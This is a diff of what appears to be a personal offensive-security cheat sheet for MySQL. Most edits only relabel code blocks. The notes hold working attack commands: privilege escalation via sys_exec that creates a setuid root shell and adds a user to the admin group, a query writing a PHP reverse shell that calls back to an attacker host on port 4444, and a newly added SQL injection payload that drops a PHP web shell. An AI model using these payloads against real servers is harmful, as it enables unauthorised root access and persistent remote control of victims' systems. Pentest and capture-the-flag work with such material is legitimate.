@@ -3,21 +3,21 @@ Connect to MYSQL server:
 ---
 #mysql #connect
 
-```shell
+```bash
 mysql -h $TARGET_IP -u $USER -p
 ```
 Show list of databases:
-```sql
+```mysql
 show databases;
 ```
 Show list of tables in current DB:
-```sql
+```mysql
 show tables;
 ```
 Priv esc if running as root:
 #mysql #privesc #priv-esc
 
-```sql
+```mysql
 use mysql;
 show tables;
 select * from func;
@@ -32,7 +32,7 @@ select sys_exec('cp /bin/sh /tmp; chown root:root /tmp/sh; chmod +s /tmp/sh');
 select sys_exec('usermod -a -G admin USER');
 ```
 
-```shell
+```bash
 cd /var/tmp
 ./bash -p
 ```
@@ -41,3 +41,9 @@ cd /var/tmp
 select "<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/$ATTACKER/4444 0>&1'\");?>" into outfile "/var/www/.../shell.php";
 ```
 ---
+write PHP into web tmp directory:
+#mysql-shell
+
+```sql
+' UNION SELECT "<?php exec($_GET['cmd']);?>", null, null, INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+```
